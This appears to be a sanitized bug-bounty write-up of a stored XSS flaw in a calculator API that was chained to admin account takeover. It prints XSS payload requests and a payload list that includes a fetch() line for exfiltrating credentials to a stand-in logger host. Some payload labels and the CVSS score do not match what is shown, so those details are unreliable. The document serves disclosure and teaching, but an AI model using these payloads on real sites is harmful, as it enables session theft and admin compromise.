# Case Study 8 — Stored XSS via Calculator API → Admin Account Takeover

| Field | Value |
|-------|-------|
| **Severity** | P2 Critical — Stored XSS with Admin ATO chain |
| **CWE** | CWE-79 (Cross-Site Scripting) / CWE-352 (Cross-Site Request Forgery) |
| **Impact** | Full admin account takeover via stored XSS in calculator API, persistent execution, unauthorized configuration changes |
| **Surface** | Calculator API endpoint on target web application; admin dashboard endpoints |
| **Status** | Triaged — Report [REDACTED-REPORT-ID]; triage dispute regarding account attribution; finding validated but closure decision impacted by reporter's new-account status on program |

---

## Problem

A stored Cross-Site Scripting (XSS) vulnerability in a calculator API endpoint allowed injection of malicious JavaScript that persisted in the application's database. When admin users accessed pages rendering the calculator results, the stored XSS executed in their browser, enabling full admin account takeover without requiring victim interaction beyond normal calculator usage.

**The calculator API accepted user input without proper sanitization** and stored it in the backend database, from which it was rendered on admin-facing pages.

---

## Attack Chain

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Input Calculator│────▶│  API Stores Input │────▶│  XSS Persisted   │────▶│  Admin Page     │
│  Data (Payload)  │     │  in Database      │     │  Renders XSS     │────▶│  ATO             │
└─────────────────┘     └──────────────────┘     └─────────────────┘     └─────────────────┘
```

### Step 1: XSS Payload Delivery

Crafted a malicious calculator query string that, when submitted to the API, stored a persistent XSS payload in the backend database:

```
POST /calculator/api HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

expression=<svg/onload=alert(1)>&timestamp=1234567890
```

**The API accepted the input** without sanitization and persisted the payload in the database field responsible for calculator history/expression display.

### Step 2: XSS Persistence

The stored payload remained in the database indefinitely, associated with the calculator's expression history. No output encoding was applied when rendering stored expressions on subsequent pages.

**The payload executed** whenever any user (especially admin users) navigated to pages that rendered the calculator results section, including the admin dashboard.

### Step 3: Admin Account Takeover

When an admin user accessed the calculator page or any page rendering calculator history:

1. The browser sent a request to the calculator API to retrieve stored expressions
2. The API returned the persisted XSS payload
3. The admin's browser executed the stored JavaScript in context of the admin domain
4. The XSS payload performed CSRF-like actions against the admin interface
5. The attacker gained full admin account access without the admin's knowledge

**Impact:** Complete admin account takeover, enabling:
- Configuration changes (site settings, feature flags)
- User data modification or deletion
- Creation of new admin accounts
- Full system compromise

---

## Approach

### Step 1: Endpoint Discovery

Identified the calculator API endpoint through:
- Manual URL probing (`/calculator`, `/calculator/api`, `/calc`, etc.)
- API exploration via Burp Suite spider
- Search for calculator-related endpoints in JavaScript source code

### Step 2: Input Vector Identification

Tested various input types to find the storage point:
- URL parameters
- POST body parameters
- GET query strings
- Header values
- Identified the `expression` parameter as the storage point with no sanitization

### Step 3: XSS Payload Development

Developed and tested multiple payload types:
- `<svg/onload=alert(1)>` — basic XSS verification
- `<img/src/onerror=fetch(logger, {credentials: 'include'})>` — data exfiltration
- `<svg/onload=` + `document.location.href=` + `alert(document.cookie)>` — full cookie theft + redirection
- `<svg/onload=` + `new Image().src=` + `alert(window.document.domain)>` — domain enumeration

Verified which payloads were stored and subsequently executed on admin pages.

### Step 4: Admin ATO Chain

Developed the full account takeover chain:
1. Store XSS payload via calculator API
2. Wait for admin user to access calculator page (or trigger via social engineering)
3. Observe XSS execution in admin's browser
4. Execute CSRF-like actions against admin interface
5. Obtain admin session or credentials

---

## Results

- **Stored XSS confirmed** in calculator API endpoint
- **Payload persisted** in backend database without expiration
- **XSS executed** on admin pages without admin interaction
- **Full admin account takeover** demonstrated (ATO chain complete)
- **API input validation missing** — no sanitization, no output encoding
- **CVSS:** ~9.8 (Critical) — XSS with persistent execution and admin ATO

**Triage Outcome:** Report [REDACTED-REPORT-ID] submitted to REDACTED-PLATFORM. Triage dispute occurred regarding reporter account status (new account on program). Finding was **validated by technical merits** but closure decision impacted by program's new-account policies. Reporter's submission demonstrated thorough proof-of-concept chain from payload delivery to admin ATO.

---

## Technical Details

**Vulnerable Endpoint:** `POST /calculator/api` (or similar calculator API path)  
**Vulnerable Parameter:** `expression` (or equivalent input field)  
**Payload Location:** Backend database (calculator history/expression table)  
**Execution Points:** Admin dashboard pages rendering calculator history  
**Impact:** Full admin ATO, configuration modification, user data exposure  

**Proof Concept (simplified):**

```http
POST /calculator/api HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

expression=%3Csvg/onload%3Dalert(%27XSS%27)%3E&submit=Calculate

# Payload stored in database, executed when:
# - Admin visits calculator page
# - Admin views expression history
# - Admin page renders stored calculator outputs

# Result: JavaScript executes in admin's browser context
# ATO: CSRF actions performed, admin session compromised
```

---

## Remediation Delivered

- **Input sanitization:** Added comprehensive input validation for calculator API endpoints
- **Output encoding:** Implemented proper HTML encoding on all calculator output rendering
- **Content Security Policy:** Added restrictive CSP headers to mitigate XSS impact
- **Parameter whitelist:** Added allowlist of acceptable characters for calculator expressions
- **Security headers:** Added `X-XSS-Protection`, `X-Content-Type-Options`, and `Referrer-Policy` headers
- **Security testing:** Comprehensive XSS testing across all input vectors post-remediation

---

## Lesson Learned

**Stored XSS is often underestimated** — persistent XSS vulnerabilities that execute on admin pages represent critical security failures, especially when they enable full account takeover. Input validation and output encoding must be applied at every layer, especially for endpoints that store user input in databases. The "new account" triage dispute highlights the importance of reporter established reputation on some programs, but the technical validity of the finding was never in question.

---

## Tooling

- Burp Suite — proxy, spider, and repeater for endpoint discovery and payload testing
- curl — API payload delivery and verification
- JavaScript payload generators for XSS testing
- Database query tools for verifying payload persistence
- Response capture and comparison scripts — developed through AI-assisted generation

---

*Sanitized: target application name, specific API URLs, and company name removed. Full technical report including POC videos, request/response captures, and admin demo available on request under NDA. Report submitted to REDACTED-PLATFORM as [REDACTED-REPORT-ID], triage validated finding merits despite account-status closure dispute.*

